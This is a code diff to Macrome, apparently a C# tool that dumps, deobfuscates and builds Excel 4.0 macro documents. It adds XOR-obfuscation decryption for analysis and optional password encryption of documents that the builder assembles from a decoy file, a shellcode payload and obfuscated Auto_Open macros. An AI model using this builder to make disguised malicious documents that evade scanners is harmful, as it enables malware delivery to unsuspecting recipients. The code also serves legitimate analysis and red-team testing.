@@ -15,6 +15,7 @@ using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
 using b2xtranslator.StructuredStorage.Reader;
 using b2xtranslator.xls.XlsFileFormat;
 using b2xtranslator.xls.XlsFileFormat.Records;
+using Macrome.Encryption;
 
 namespace Macrome
 {
@@ -38,8 +39,10 @@ namespace Macrome
         /// <param name="path">Path to the XLS file to dump</param>
         /// <param name="dumpAll">Dump all BIFF records, not the most commonly used by maldocs</param>
         /// <param name="showAttrInfo">Explicitly display PtgAttr information in Formula strings. Defaults to False.</param>
-        /// <param name="dumpHexBytes">Dump the byte content of each BIFF record in addition to its content summary. Defaults to False.</param>
-        public static void Dump(FileInfo path, bool dumpAll = false, bool showAttrInfo = false, bool dumpHexBytes = false)
+        /// <param name="dumpHexBytes">Dump the byte content of each BIFF record in addition to its content summary.</param>
+        /// <param name="password">XOR Obfuscation decryption password to try. Defaults to VelvetSweatshop if FilePass record is found.</param>
+        /// <param name="disableDecryption">Use this flag in order to skip decryption of the file before dumping.</param>
+        public static void Dump(FileInfo path, bool dumpAll = false, bool showAttrInfo = false, bool dumpHexBytes = false, string password = "VelvetSweatshop", bool disableDecryption = false)
         {
             if (path == null)
             {
@@ -55,15 +58,30 @@ namespace Macrome
 
             WorkbookStream wbs = new WorkbookStream(path.FullName);
 
-            
+            if (wbs.HasPasswordToOpen() && !disableDecryption)
+            {
+                Console.WriteLine("FilePass record found - attempting to decrypt with password " + password);
+                XorObfuscation xorObfuscation = new XorObfuscation();
+                try
+                {
+                    wbs = xorObfuscation.DecryptWorkbookStream(wbs, password);
+                }
+                catch (ArgumentException argEx)
+                {
+                    Console.WriteLine("Password " + password + " does not match the verifier value of the document FilePass. Try a different password.");
+                    return;
+                }
+            }
 
             int numBytesToDump = 0;
             if (dumpHexBytes) numBytesToDump = 0x1000;
 
             if (dumpAll)
             {
+                List<BiffRecord> records;
                 WorkbookStream fullStream = new WorkbookStream(PtgHelper.UpdateGlobalsStreamReferences(wbs.Records));
-                foreach (var record in fullStream.Records)
+                records = fullStream.Records;
+                foreach (var record in records)
                 {
                     Console.WriteLine(record.ToHexDumpString(numBytesToDump, showAttrInfo));
                 }
@@ -80,8 +98,9 @@ namespace Macrome
         /// </summary>
         /// <param name="path">Path to the XLS file to deobfuscate</param>
         /// <param name="neuterFile">Flag to insert a HALT() expression into all Auto_Open start locations. NOT IMPLEMENTED</param>
+        /// <param name="password">XOR Obfuscation decryption password to try. Defaults to VelvetSweatshop if FilePass record is found.</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to deobfuscated.xls</param>
-        public static void Deobfuscate(FileInfo path, bool neuterFile = false, string outputFileName = "deobfuscated.xls")
+        public static void Deobfuscate(FileInfo path, bool neuterFile = false, string password = "VelvetSweatshop", string outputFileName = "deobfuscated.xls")
         {
             if (path == null)
             {
@@ -101,7 +120,24 @@ namespace Macrome
             }
 
             WorkbookStream wbs = new WorkbookStream(path.FullName);
+
+            if (wbs.HasPasswordToOpen())
+            {
+                Console.WriteLine("FilePass record found - attempting to decrypt with password " + password);
+                XorObfuscation xorObfuscation = new XorObfuscation();
+                try
+                {
+                    wbs = xorObfuscation.DecryptWorkbookStream(wbs, password);
+                }
+                catch (ArgumentException argEx)
+                {
+                    Console.WriteLine("Password " + password + " does not match the verifier value of the document FilePass. Try a different password.");
+                    return;
+                }
+            }
+
             WorkbookEditor wbEditor = new WorkbookEditor(wbs);
+
             wbEditor.NormalizeAutoOpenLabels();
             wbEditor.UnhideSheets();
 
@@ -123,11 +159,12 @@ namespace Macrome
         /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
+        /// <param name="password">Password to encrypt document using XOR Obfuscation.</param>
         /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
         public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
             PayloadType payloadType = PayloadType.Shellcode, 
             string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
-            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc)
+            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, string password = "")
         {
             if (decoyDocument == null || payload == null)
             {
@@ -250,10 +287,20 @@ namespace Macrome
 
             wbe.ObfuscateAutoOpen();
 
+            WorkbookStream createdWorkbook = wbe.WbStream;
+
+            if (!string.IsNullOrEmpty(password))
+            {
+                Console.WriteLine("Encrypting Document with Password " + password);
+                XorObfuscation xorObfuscation = new XorObfuscation();
+                createdWorkbook = xorObfuscation.EncryptWorkbookStream(createdWorkbook, password);
+                // createdWorkbook = createdWorkbook.FixBoundSheetOffsets();
+            }
+
             ExcelDocWriter writer = new ExcelDocWriter();
             string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputFileName;
             Console.WriteLine("Writing generated document to {0}", outputPath);
-            writer.WriteDocument(outputPath, wbe.WbStream);
+            writer.WriteDocument(outputPath, createdWorkbook);
         }
 
 
